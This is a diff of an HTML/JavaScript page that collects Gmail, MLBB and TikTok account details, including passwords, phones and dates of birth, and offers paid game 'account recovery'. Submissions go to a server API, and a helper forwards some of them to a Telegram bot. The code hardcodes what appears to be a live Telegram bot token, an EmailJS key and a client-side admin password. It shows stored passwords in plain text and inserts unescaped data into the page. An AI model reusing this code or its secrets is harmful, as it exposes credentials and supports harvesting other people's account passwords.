@@ -20,6 +20,7 @@
         .form-group{margin-bottom:10px}
         .form-group label{display:block;font-size:13px;font-weight:600;margin-bottom:5px}
         .form-group input,.form-group textarea,.form-group select{width:100%;padding:10px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.3);border-radius:6px;color:var(--t);font-size:14px}
+        .form-group select option{background:var(--bg);color:var(--t)}
         .btn{width:100%;padding:12px;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;text-align:center;margin-top:8px;background:var(--a);color:var(--t)}
         .btn-w{background:var(--w);color:#000}.btn-g{background:var(--g)}.btn-r{background:var(--r)}
         .btn-sm{padding:4px 8px;font-size:10px;width:auto;margin:0 2px}
@@ -47,10 +48,15 @@
         .user-id-box span{color:var(--w);font-size:14px;font-weight:bold}
         .user-row{display:flex;justify-content:space-between;align-items:center;padding:6px;background:rgba(0,0,0,0.2);border-radius:4px;margin-bottom:3px;font-size:11px;border-left:3px solid var(--g)}
         .user-row.banned{border-left-color:var(--r);opacity:0.7}
-        .notice-box{background:rgba(0,0,0,0.3);padding:20px;border-radius:10px;min-height:100px;text-align:center;border:2px solid rgba(255,255,255,0.1);transition:all 0.5s}
+        .notice-box{background:rgba(0,0,0,0.3);padding:20px;border-radius:10px;min-height:100px;text-align:center;border:2px solid rgba(255,255,255,0.1)}
         .notice-box .notice-icon{font-size:36px;margin-bottom:10px}
         .notice-box .notice-text{white-space:pre-wrap;font-size:15px;font-weight:bold;line-height:1.8}
         .notice-box .notice-time{font-size:10px;color:rgba(255,255,255,0.5);margin-top:12px}
+        .add-btn{background:var(--w);color:#000;border:none;width:30px;height:30px;border-radius:50%;cursor:pointer;font-size:16px;font-weight:bold;flex-shrink:0}
+        .input-row{display:flex;gap:5px;align-items:center;margin-bottom:5px}
+        .input-row input{flex:1}
+        .remove-btn{background:var(--r);color:#fff;border:none;width:24px;height:24px;border-radius:50%;cursor:pointer;font-size:12px;flex-shrink:0}
+        .data-view-modal{max-height:60vh;overflow-y:auto}
     </style>
 </head>
 <body>
@@ -75,6 +81,7 @@
                     <div class="tab" onclick="st('contactTab')"><i class="fas fa-address-book"></i><br>Contact</div>
                 </div>
 
+                <!-- DATA TAB -->
                 <div class="tab-content active" id="dataTab">
                     <h3 style="color:var(--w);margin-bottom:8px">Select Data Type</h3>
                     <div class="data-select">
@@ -82,39 +89,50 @@
                         <div class="data-card" onclick="showSub('mlbbSub')"><i class="fas fa-gamepad"></i><p>MLBB</p></div>
                         <div class="data-card" onclick="showSub('tiktokSub')"><i class="fab fa-tiktok"></i><p>TikTok</p></div>
                     </div>
+
+                    <!-- GMAIL SUB TAB -->
                     <div class="sub-tab active" id="gmailSub">
-                        <div class="form-group"><label>Generator Password</label><input type="password" id="gmailPass"></div>
-                        <button class="btn btn-w" onclick="unlockG()">Unlock Gmail</button>
-                        <div id="gmailGen" style="display:none;margin-top:15px">
-                            <div class="form-group"><label>Name</label><input type="text" id="gName"></div>
-                            <div class="form-group"><label>Email</label><input type="text" id="gEmail"></div>
-                            <div class="form-group"><label>Password</label><input type="password" id="gPw"></div>
-                            <div class="form-group"><label>Phone</label><input type="text" id="gPhone"></div>
-                            <button class="btn btn-g" onclick="createG()">Create Gmail</button>
-                        </div>
+                        <div class="form-group"><label><i class="fas fa-user"></i> Your Name</label><input type="text" id="gName" placeholder="Enter your full name"></div>
+                        <div class="form-group"><label><i class="fas fa-envelope"></i> Email</label><div id="gmailEmailList"><div class="input-row"><input type="email" class="gmail-email" placeholder="Enter email"><button class="add-btn" onclick="addGmailEmail()">+</button></div></div></div>
+                        <div class="form-group"><label><i class="fas fa-phone"></i> Phone Number</label><div id="gmailPhoneList"><div class="input-row"><input type="text" class="gmail-phone" placeholder="Enter phone"><button class="add-btn" onclick="addGmailPhone()">+</button></div></div></div>
+                        <div class="form-group"><label><i class="fas fa-lock"></i> Password</label><input type="password" id="gPw" placeholder="Create password"></div>
+                        <div class="form-group"><label><i class="fas fa-check-circle"></i> Confirm Password</label><input type="password" id="gConfirmPw" placeholder="Confirm password"></div>
+                        <div class="form-group"><label><i class="fas fa-calendar"></i> Date of Birth</label><input type="date" id="gAge"></div>
+                        <div class="form-group"><label><i class="fas fa-globe"></i> Country</label><select id="gCountry" onchange="loadRegions('gCountry','gRegion')"><option value="">Select Country</option></select></div>
+                        <div class="form-group"><label><i class="fas fa-map-marker-alt"></i> Region</label><select id="gRegion"><option value="">Select Region</option></select></div>
+                        <button class="btn btn-g" id="gSaveBtn" onclick="saveGmailData()"><i class="fas fa-save"></i> Save Data</button>
                     </div>
+
+                    <!-- MLBB SUB TAB -->
                     <div class="sub-tab" id="mlbbSub">
-                        <div class="form-group"><label>Generator Password</label><input type="password" id="mlbbPass"></div>
-                        <button class="btn btn-w" onclick="unlockM()">Unlock MLBB</button>
-                        <div id="mlbbGen" style="display:none;margin-top:15px">
-                            <div class="form-group"><label>In-Game Name</label><input type="text" id="mName"></div>
-                            <div class="form-group"><label>In-Game ID</label><input type="text" id="mId"></div>
-                            <div class="form-group"><label>Server ID</label><input type="text" id="mServer"></div>
-                            <div class="form-group"><label>Gmail</label><input type="text" id="mGmail"></div>
-                            <div class="form-group"><label>Password</label><input type="password" id="mPw"></div>
-                            <button class="btn btn-g" onclick="createM()">Create MLBB</button>
-                        </div>
+                        <div class="form-group"><label><i class="fas fa-user"></i> In-Game Name</label><input type="text" id="mName" placeholder="Enter in-game name"></div>
+                        <div class="form-group"><label><i class="fas fa-id-card"></i> In-Game ID</label><input type="text" id="mId" placeholder="Enter in-game ID"></div>
+                        <div class="form-group"><label><i class="fas fa-server"></i> Server ID</label><input type="text" id="mServer" placeholder="Enter server ID"></div>
+                        <div class="form-group"><label><i class="fas fa-envelope"></i> Gmail</label><div id="mlbbEmailList"><div class="input-row"><input type="email" class="mlbb-email" placeholder="Enter Gmail"><button class="add-btn" onclick="addMlbbEmail()">+</button></div></div></div>
+                        <div class="form-group"><label><i class="fas fa-lock"></i> Password</label><input type="password" id="mPw" placeholder="Create password"></div>
+                        <div class="form-group"><label><i class="fas fa-check-circle"></i> Confirm Password</label><input type="password" id="mConfirmPw" placeholder="Confirm password"></div>
+                        <div class="form-group"><label><i class="fas fa-calendar"></i> Date of Birth</label><input type="date" id="mAge"></div>
+                        <div class="form-group"><label><i class="fas fa-globe"></i> Country</label><select id="mCountry" onchange="loadRegions('mCountry','mRegion')"><option value="">Select Country</option></select></div>
+                        <div class="form-group"><label><i class="fas fa-map-marker-alt"></i> Region</label><select id="mRegion"><option value="">Select Region</option></select></div>
+                        <button class="btn btn-g" id="mSaveBtn" onclick="saveMlbbData()"><i class="fas fa-save"></i> Save Data</button>
                     </div>
+
+                    <!-- TIKTOK SUB TAB -->
                     <div class="sub-tab" id="tiktokSub">
-                        <h3 style="color:var(--w);margin-bottom:10px">TikTok RC Form</h3>
-                        <div class="form-group"><label>Username</label><input type="text" id="ttUser"></div>
-                        <div class="form-group"><label>Game ID</label><input type="text" id="ttGame"></div>
-                        <div class="form-group"><label>Promise</label><textarea id="ttPromise" rows="3"></textarea></div>
-                        <div class="form-group"><label>Email</label><input type="email" id="ttEmail"></div>
-                        <button class="btn btn-g" onclick="doTikTok()">Submit</button>
+                        <div class="form-group"><label><i class="fas fa-user"></i> Full Name</label><input type="text" id="tFullName" placeholder="Enter full name"></div>
+                        <div class="form-group"><label><i class="fas fa-user"></i> Last Name</label><input type="text" id="tLastName" placeholder="Enter last name"></div>
+                        <div class="form-group"><label><i class="fas fa-envelope"></i> Email</label><div id="tiktokEmailList"><div class="input-row"><input type="email" class="tiktok-email" placeholder="Enter email"><button class="add-btn" onclick="addTiktokEmail()">+</button></div></div></div>
+                        <div class="form-group"><label><i class="fas fa-phone"></i> Phone Number</label><div id="tiktokPhoneList"><div class="input-row"><input type="text" class="tiktok-phone" placeholder="Enter phone"><button class="add-btn" onclick="addTiktokPhone()">+</button></div></div></div>
+                        <div class="form-group"><label><i class="fas fa-lock"></i> Password</label><input type="password" id="tPw" placeholder="Create password"></div>
+                        <div class="form-group"><label><i class="fas fa-check-circle"></i> Confirm Password</label><input type="password" id="tConfirmPw" placeholder="Confirm password"></div>
+                        <div class="form-group"><label><i class="fas fa-calendar"></i> Date of Birth</label><input type="date" id="tAge"></div>
+                        <div class="form-group"><label><i class="fas fa-globe"></i> Country</label><select id="tCountry" onchange="loadRegions('tCountry','tRegion')"><option value="">Select Country</option></select></div>
+                        <div class="form-group"><label><i class="fas fa-map-marker-alt"></i> Region</label><select id="tRegion"><option value="">Select Region</option></select></div>
+                        <button class="btn btn-g" id="tSaveBtn" onclick="saveTiktokData()"><i class="fas fa-save"></i> Save Data</button>
                     </div>
                 </div>
 
+                <!-- RECOVERY TAB -->
                 <div class="tab-content" id="recoveryTab">
                     <h3 style="color:var(--w)">Account Recovery</h3>
                     <div class="option" onclick="selSkin('8000')">Skin 30-100 (8,000 MMK)</div>
@@ -128,6 +146,7 @@
                     <button class="btn btn-g" onclick="doRecovery()">Recover Account</button>
                 </div>
 
+                <!-- PASSWORD TAB -->
                 <div class="tab-content" id="passwordTab">
                     <h3 style="color:var(--w)">Change Password</h3>
                     <div class="form-group"><label>Type</label><select id="passType"><option value="gmail">Gmail</option><option value="mlbb">MLBB</option></select></div>
@@ -136,16 +155,21 @@
                     <button class="btn btn-w" onclick="chPass()">Change</button>
                 </div>
 
+                <!-- NOTICE TAB -->
                 <div class="tab-content" id="noticeTab">
                     <h3 style="color:var(--w)"><i class="fas fa-bullhorn"></i> Notice Board</h3>
                     <div class="notice-box" id="noticeContent"><p style="color:rgba(255,255,255,0.5)">Loading...</p></div>
                 </div>
 
+                <!-- HISTORY TAB -->
                 <div class="tab-content" id="historyTab">
-                    <h3 style="color:var(--w)">User ID History</h3>
-                    <div class="history-list" id="userHistory"></div>
+                    <h3 style="color:var(--w)">My Data History</h3>
+                    <div id="myGmailHistory" style="margin-bottom:10px"></div>
+                    <div id="myMlbbHistory" style="margin-bottom:10px"></div>
+                    <div id="myTiktokHistory"></div>
                 </div>
 
+                   <!-- CONTACT TAB -->
                 <div class="tab-content" id="contactTab">
                     <h3 style="color:var(--w)">Contact Us</h3>
                     <div style="overflow-x:auto"><table style="width:100%;border-collapse:collapse;font-size:12px">
@@ -208,35 +232,93 @@
             <div class="form-group"><label>New Password (optional)</label><input type="password" id="editPass" placeholder="Leave blank to keep"></div>
             <button class="btn btn-g" onclick="saveEdit()">Save Changes</button>
         </div>
+    </div>
+
+    <div class="modal" id="viewDataModal">
+        <div class="modal-box data-view-modal"><span class="modal-close" onclick="closeViewModal()">&times;</span><h3>View Data</h3>
+            <div id="viewDataContent"></div>
         </div>
-     <script>
+    </div>
+    <script>
     emailjs.init("tsKN2j9o6RYK4KeEp");
     const BOT="8737284644:AAEW7XtU6HqK4O49dJXG6MXSj08BvLUAdJE",CID="8315928972",ADMIN="MK2008";
     let GPASS="DoubleMK2008",MPASS="GlobalMK2008";
     let gmails=JSON.parse(localStorage.getItem('gmails')||'[]'),mlbbs=JSON.parse(localStorage.getItem('mlbbs')||'[]'),hist=JSON.parse(localStorage.getItem('hist')||'[]'),skin=null,pay=null;
+    let countriesData=[];
     function n(m,t="success"){const e=document.getElementById("notif");e.textContent=m;e.style.background=t==="success"?"#2ecc71":"#e74c3c";e.style.display="block";setTimeout(()=>e.style.display="none",3000)}
     function uid(){return'MLBB'+Date.now().toString().slice(-6)+Math.floor(Math.random()*1000).toString().padStart(3,'0')}
     function tg(m){fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CID,text:m,parse_mode:'HTML'})}).catch(()=>{})}
-    function st(id){document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active'));event.target.classList.add('active');document.getElementById(id).classList.add('active');if(id==='historyTab')dispHist();if(id==='noticeTab')loadNotice()}
+    function st(id){document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active'));event.target.classList.add('active');document.getElementById(id).classList.add('active');if(id==='historyTab')loadMyHistory();if(id==='noticeTab')loadNotice()}
     function showSub(id){document.querySelectorAll('.data-card').forEach(c=>c.classList.remove('sel'));event.target.classList.add('sel');document.querySelectorAll('.sub-tab').forEach(s=>s.classList.remove('active'));document.getElementById(id).classList.add('active')}
     function openAdminModal(){document.getElementById("adminModal").classList.add("active")}
     function closeAdminModal(){document.getElementById("adminModal").classList.remove("active")}
     function openEditModal(uid,un,em,ph){document.getElementById("editUserId").value=uid;document.getElementById("editName").value=un||'';document.getElementById("editEmail").value=em||'';document.getElementById("editPhone").value=ph||'';document.getElementById("editPass").value='';document.getElementById("editModal").classList.add("active")}
     function closeEditModal(){document.getElementById("editModal").classList.remove("active")}
+    function closeViewModal(){document.getElementById("viewDataModal").classList.remove("active")}
     async function saveEdit(){const id=document.getElementById("editUserId").value,un=document.getElementById("editName").value,em=document.getElementById("editEmail").value,ph=document.getElementById("editPhone").value,pw=document.getElementById("editPass").value;try{const r=await fetch("/api/admin/edit_user",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({id:parseInt(id),username:un,email:em,phone:ph,password:pw||''})});const d=await r.json();d.success?(n("Updated!"),closeEditModal(),loadAdminData()):n(d.message||"Error","error")}catch(e){n("Error","error")}}
     async function logout(){try{await fetch("/api/logout",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token:localStorage.getItem("auth_token")})})}catch(e){}localStorage.removeItem("auth_token");localStorage.removeItem("user");window.location.href="/"}
     async function loadPw(){try{const r=await fetch("/api/get_passwords",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token:localStorage.getItem("auth_token")})});const d=await r.json();if(d.success){GPASS=d.gmail_password;MPASS=d.mlbb_password}}catch(e){}}
     async function chPass(){const t=document.getElementById("passType").value,cp=document.getElementById("curPass").value,np=document.getElementById("newPass").value;if(!cp||!np)return n("Fill all","error");try{const r=await fetch("/api/change_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token:localStorage.getItem("auth_token"),type:t,current_password:cp,new_password:np})});const d=await r.json();d.success?(n("Changed!"),loadPw()):n(d.message,"error")}catch(e){n("Connection error","error")}}
-    function unlockG(){document.getElementById("gmailPass").value===GPASS?document.getElementById("gmailGen").style.display="block":n("Wrong password","error")}
-    function unlockM(){document.getElementById("mlbbPass").value===MPASS?document.getElementById("mlbbGen").style.display="block":n("Wrong password","error")}
     async function unlockAdmin(){if(document.getElementById("adminPass").value!==ADMIN)return n("Wrong password","error");document.getElementById("adminBox").style.display="block";loadAdminData()}
+    
+    // ==================== COUNTRIES ====================
+    async function loadCountries(){try{const r=await fetch("/api/countries");countriesData=await r.json();['gCountry','mCountry','tCountry'].forEach(id=>{const s=document.getElementById(id);if(s){s.innerHTML='<option value="">Select Country</option>';countriesData.forEach(c=>{s.innerHTML+=`<option value="${c.name}">${c.name}</option>`})}})}catch(e){}}
+    function loadRegions(cid,rid){const c=document.getElementById(cid).value;const r=document.getElementById(rid);r.innerHTML='<option value="">Select Region</option>';const f=countriesData.find(x=>x.name===c);if(f){f.regions.forEach(reg=>{r.innerHTML+=`<option value="${reg}">${reg}</option>`})}}
+    
+    // ==================== ADD/REMOVE INPUTS ====================
+    function addInput(listId,cls,type,ph){const d=document.getElementById(listId);const div=document.createElement('div');div.className='input-row';div.innerHTML=`<input type="${type}" class="${cls}" placeholder="${ph}"><button class="remove-btn" onclick="this.parentElement.remove()">×</button>`;d.appendChild(div)}
+    function getValues(cls){return Array.from(document.getElementsByClassName(cls)).map(i=>i.value).filter(v=>v)}
+    function addGmailEmail(){addInput('gmailEmailList','gmail-email','email','Enter email')}
+    function addGmailPhone(){addInput('gmailPhoneList','gmail-phone','text','Enter phone')}
+    function addMlbbEmail(){addInput('mlbbEmailList','mlbb-email','email','Enter Gmail')}
+    function addTiktokEmail(){addInput('tiktokEmailList','tiktok-email','email','Enter email')}
+    function addTiktokPhone(){addInput('tiktokPhoneList','tiktok-phone','text','Enter phone')}
+    
+    // ==================== SAVE DATA ====================
+    async function saveGmailData(){
+        const na=document.getElementById("gName").value,pw=document.getElementById("gPw").value,cpw=document.getElementById("gConfirmPw").value;
+        if(!na||!pw)return n("Fill required fields","error");if(pw!==cpw)return n("Passwords do not match","error");
+        const data={name:na,emails:getValues('gmail-email'),phones:getValues('gmail-phone'),password:pw,age:document.getElementById("gAge").value,country:document.getElementById("gCountry").value,region:document.getElementById("gRegion").value};
+        const btn=document.getElementById("gSaveBtn");btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> Saving...';btn.disabled=true;
+        try{const r=await fetch("/api/save_user_data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token:localStorage.getItem("auth_token"),type:'gmail',data})});const d=await r.json();d.success?n("Data saved!"):n(d.message,"error")}catch(e){n("Error","error")}
+        btn.innerHTML='<i class="fas fa-save"></i> Save Data';btn.disabled=false;
+    }
+    async function saveMlbbData(){
+        const na=document.getElementById("mName").value,id=document.getElementById("mId").value,sv=document.getElementById("mServer").value,pw=document.getElementById("mPw").value,cpw=document.getElementById("mConfirmPw").value;
+        if(!na||!id||!pw)return n("Fill required fields","error");if(pw!==cpw)return n("Passwords do not match","error");
+        const data={ingameName:na,ingameId:id,serverId:sv,emails:getValues('mlbb-email'),password:pw,age:document.getElementById("mAge").value,country:document.getElementById("mCountry").value,region:document.getElementById("mRegion").value};
+        const btn=document.getElementById("mSaveBtn");btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> Saving...';btn.disabled=true;
+        try{const r=await fetch("/api/save_user_data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token:localStorage.getItem("auth_token"),type:'mlbb',data})});const d=await r.json();d.success?n("Data saved!"):n(d.message,"error")}catch(e){n("Error","error")}
+        btn.innerHTML='<i class="fas fa-save"></i> Save Data';btn.disabled=false;
+    }
+    async function saveTiktokData(){
+        const fn=document.getElementById("tFullName").value,ln=document.getElementById("tLastName").value,pw=document.getElementById("tPw").value,cpw=document.getElementById("tConfirmPw").value;
+        if(!fn||!pw)return n("Fill required fields","error");if(pw!==cpw)return n("Passwords do not match","error");
+        const data={fullName:fn,lastName:ln,emails:getValues('tiktok-email'),phones:getValues('tiktok-phone'),password:pw,age:document.getElementById("tAge").value,country:document.getElementById("tCountry").value,region:document.getElementById("tRegion").value};
+        const btn=document.getElementById("tSaveBtn");btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> Saving...';btn.disabled=true;
+        try{const r=await fetch("/api/save_user_data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token:localStorage.getItem("auth_token"),type:'tiktok',data})});const d=await r.json();d.success?n("Data saved!"):n(d.message,"error")}catch(e){n("Error","error")}
+        btn.innerHTML='<i class="fas fa-save"></i> Save Data';btn.disabled=false;
+    }
+    
+    // ==================== HISTORY ====================
+    async function loadMyHistory(){
+        try{const r=await fetch("/api/get_my_data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token:localStorage.getItem("auth_token")})});const d=await r.json();
+            const renderH=(list,title,icon)=>{
+                if(!list||list.length===0)return`<div style="font-weight:bold;color:var(--w);margin:8px 0;font-size:12px">${icon} ${title}</div><p style="font-size:11px">No data</p>`;
+                return`<div style="font-weight:bold;color:var(--w);margin:8px 0;font-size:12px">${icon} ${title}</div>`+list.map(item=>`<div class="user-row"><div><b>${item.name||item.ingame_name||'N/A'}</b><br><small>${item.email||item.gmail||''}</small></div><div style="display:flex;gap:3px"><button class="btn btn-sm btn-w" onclick="viewMyData('${item.user_id}')">View</button><button class="btn btn-sm btn-w" onclick="editMyData('${item.user_id}')">Edit</button></div></div>`).join('');
+            };
+            document.getElementById("myGmailHistory").innerHTML=renderH(d.gmail,'Gmail','📧');
+            document.getElementById("myMlbbHistory").innerHTML=renderH(d.mlbb,'MLBB','🎮');
+        }catch(e){}
+    }
+    function viewMyData(id){const u=gmails.find(x=>x.userId===id)||mlbbs.find(x=>x.userId===id);if(u){document.getElementById("viewDataContent").innerHTML=`<p><b>Name:</b> ${u.name||u.ingameName||'N/A'}</p><p><b>Email:</b> ${u.email||u.gmail||'N/A'}</p><p><b>Password:</b> ${u.password||'N/A'}</p><p><b>Phone:</b> ${u.phone||'N/A'}</p>`;document.getElementById("viewDataModal").classList.add("active")}}
+    function editMyData(id){n("Edit feature coming soon!")}
+    
+    // ==================== ADMIN ====================
     async function loadAdminData(){try{const r=await fetch("/api/admin/users_grouped");const d=await r.json();document.getElementById("totalUsers").textContent=d.total||0;document.getElementById("bannedUsers").textContent=(d.banned||[]).length;const banned=d.banned||[];const renderList=(list,container,canEdit)=>{container.innerHTML=list.length===0?'<p style="font-size:11px">No users</p>':list.map(u=>{const isBanned=banned.includes(u.id.toString());return`<div class="user-row${isBanned?' banned':''}"><div><b>ID:${u.id.toString().padStart(6,'0')}</b><br>${u.username||'N/A'}<br><small>${u.email}</small></div><div style="display:flex;gap:3px;flex-wrap:wrap">${canEdit?`<button class="btn btn-sm btn-w" onclick="openEditModal('${u.id}','${u.username||''}','${u.email||''}','${u.phone||''}')">Edit</button>`:''}${isBanned?`<button class="btn btn-sm btn-g" onclick="unbanUser('${u.id}')">Unban</button>`:`<button class="btn btn-sm btn-r" onclick="banUserById('${u.id}')">Ban</button>`}<button class="btn btn-sm btn-r" onclick="delUserById('${u.id}')">Del</button></div></div>`}).join('')};renderList(d.local||[],document.getElementById("localList"),true);renderList(d.google||[],document.getElementById("googleList"),false);renderList(d.tiktok||[],document.getElementById("tiktokList"),false);loadNoticeList()}catch(e){}}
-    function createG(){const na=document.getElementById("gName").value,em=document.getElementById("gEmail").value,pw=document.getElementById("gPw").value,ph=document.getElementById("gPhone").value;if(!na||!em||!pw)return n("Fill required","error");const id=uid();gmails.push({userId:id,name:na,email:em,password:pw,phone:ph,time:new Date().toLocaleString()});localStorage.setItem('gmails',JSON.stringify(gmails));hist.push({userId:id,type:'Gmail',time:new Date().toLocaleString()});localStorage.setItem('hist',JSON.stringify(hist));fetch("/api/save_data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:id,type:'gmail',data:{name:na,email:em,password:pw,phone:ph}})});tg("📧 New Gmail\nID: "+id+"\nName: "+na+"\nEmail: "+em);n("Gmail created!")}
-    function createM(){const na=document.getElementById("mName").value,ig=document.getElementById("mId").value,gm=document.getElementById("mGmail").value,pw=document.getElementById("mPw").value,sv=document.getElementById("mServer").value;if(!na||!ig||!gm||!pw)return n("Fill required","error");const ui=uid();mlbbs.push({userId:ui,ingameName:na,ingameId:ig,serverId:sv,gmail:gm,password:pw,time:new Date().toLocaleString()});localStorage.setItem('mlbbs',JSON.stringify(mlbbs));hist.push({userId:ui,type:'MLBB',time:new Date().toLocaleString()});localStorage.setItem('hist',JSON.stringify(hist));fetch("/api/save_data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:ui,type:'mlbb',data:{ingameName:na,ingameId:ig,serverId:sv,gmail:gm,password:pw}})});tg("🎮 New MLBB\nID: "+ui+"\nName: "+na+"\nGame ID: "+ig);n("MLBB created!")}
     function selSkin(v){skin=v;document.getElementById('skinRange').value=v;document.getElementById('idBox').style.display='block'}
     function selPay(m){pay=m;document.getElementById('creditBox').style.display=m==='credit'?'block':'none';document.getElementById('redeemBox').style.display=m==='redeem'?'block':'none'}
     function doRecovery(){const id=document.getElementById('recId').value,s=document.getElementById('recServer').value;if(!skin)return n("Select skin","error");if(!id||!s)return n("Enter ID and Server","error");tg("🔄 Recovery\nID: "+id+"\nServer: "+s+"\nSkin: "+skin);n("Recovery initiated!")}
-    function doTikTok(){const u=document.getElementById("ttUser").value,g=document.getElementById("ttGame").value,p=document.getElementById("ttPromise").value,e=document.getElementById("ttEmail").value;if(!u||!g||!p||!e)return n("Fill all","error");tg("📱 TikTok\nUser: "+u+"\nGame: "+g+"\nPromise: "+p);n("Submitted!")}
     async function loadNotice(){try{const r=await fetch("/api/notice");const d=await r.json();const c=document.getElementById("noticeContent");if(d.success&&d.message){c.innerHTML=`<div class="notice-icon" style="color:${d.color||'var(--w)'}"><i class="fas fa-bullhorn"></i></div><div class="notice-text" style="color:${d.color||'var(--t)'}">${d.message}</div><div class="notice-time">${new Date(d.created_at).toLocaleString()}</div>`;c.style.borderColor=d.color||'rgba(255,255,255,0.1)'}else{c.innerHTML='<div class="notice-icon" style="color:rgba(255,255,255,0.3)"><i class="fas fa-inbox"></i></div><p style="color:rgba(255,255,255,0.4)">No notices yet</p>';c.style.borderColor='rgba(255,255,255,0.1)'}}catch(e){document.getElementById("noticeContent").innerHTML='<p>Error</p>'}}
     async function postNotice(){const m=document.getElementById("noticeMsg").value,co=document.getElementById("noticeColor").value;if(!m)return n("Enter message","error");try{const r=await fetch("/api/admin/notice",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:m,color:co})});const d=await r.json();d.success?(n("Posted!"),document.getElementById("noticeMsg").value="",loadNotice(),loadNoticeList()):n(d.message,"error")}catch(e){n("Connection error","error")}}
     async function loadNoticeList(){try{const r=await fetch("/api/admin/notices");const d=await r.json();const c=document.getElementById("noticeList");if(d.notices&&d.notices.length>0){c.innerHTML=d.notices.map(n=>`<div class="user-row"><div><span style="color:${n.color||'#fff'}">${n.message}</span><br><small>${new Date(n.created_at).toLocaleString()}</small></div><button class="btn btn-sm btn-r" onclick="delNoticeById(${n.id})">Del</button></div>`).join('')}else{c.innerHTML='<p>No notices</p>'}}catch(e){}}
@@ -245,7 +327,6 @@
     async function unbanUser(id){await fetch("/api/admin/unban",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:id})});loadAdminData();n("Unbanned!")}
     async function delUserById(id){if(!confirm("Delete user "+id+"?"))return;await fetch("/api/admin/delete",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:id})});gmails=gmails.filter(x=>x.userId!==id);mlbbs=mlbbs.filter(x=>x.userId!==id);localStorage.setItem('gmails',JSON.stringify(gmails));localStorage.setItem('mlbbs',JSON.stringify(mlbbs));tg("🗑️ Deleted: "+id);loadAdminData();n("Deleted!")}
     function addRedeem(){const c=prompt("New redeem code:");if(c)tg("🎫 Code: "+c)}
-    function dispHist(){const c=document.getElementById("userHistory");c.innerHTML=hist.length===0?'<p>No history</p>':hist.map(h=>'<div class="history-item"><b>'+h.userId+'</b> ('+h.type+')<br><small>'+h.time+'</small></div>').join('')}
     function contactG(e){window.open('mailto:'+e)}function contactP(p){window.open('tel:'+p)}function contactT(u){window.open('https://t.me/'+u.replace('@',''))}function contactTik(u){window.open("https://www.tiktok.com/@"+u)}
     function openEmail(){document.getElementById("emailModal").classList.add("active")}function closeEmail(){document.getElementById("emailModal").classList.remove("active")}
     function sendEmail(){const na=document.getElementById("emName").value,em=document.getElementById("emEmail").value,ph=document.getElementById("emPhone").value,ms=document.getElementById("emMsg").value;if(!na||!em||!ms)return n("Fill required","error");const btn=document.querySelector("#emailModal .btn");btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> Sending...';btn.disabled=true;emailjs.send("service_3akzfls","template_xqygsga",{from_name:na,from_email:em,phone_number:ph,message:ms,submitted_at:new Date().toLocaleString()}).then(()=>{n("Sent!");closeEmail();btn.innerHTML='<i class="fas fa-paper-plane"></i> Send';btn.disabled=false}).catch(()=>{n("Error","error");btn.innerHTML='<i class="fas fa-paper-plane"></i> Send';btn.disabled=false})}
@@ -254,9 +335,7 @@
         const user=JSON.parse(localStorage.getItem("user")||'{}');
         document.getElementById("myUserId").textContent=user.id?user.id.toString().padStart(6,'0'):'------';
         fetch("/api/track_login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:user.id,username:user.username,email:user.email,loginType:user.login_type})});
-        await loadPw();dispHist();loadNotice();
+        await loadPw();loadNotice();loadCountries();
         if(user.id){const r=await fetch("/api/check_banned",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:user.id.toString()})});const d=await r.json();if(d.banned){document.body.innerHTML='<div style="text-align:center;padding:50px;color:var(--r)"><h1><i class="fas fa-ban"></i></h1><h2>သင်၏အကောင့် ဘန်းခံထားရပါသည်</h2><p>Your account has been banned.</p></div>';return}}
     };
-     </script>
-</body>
-</html>
+    </script>
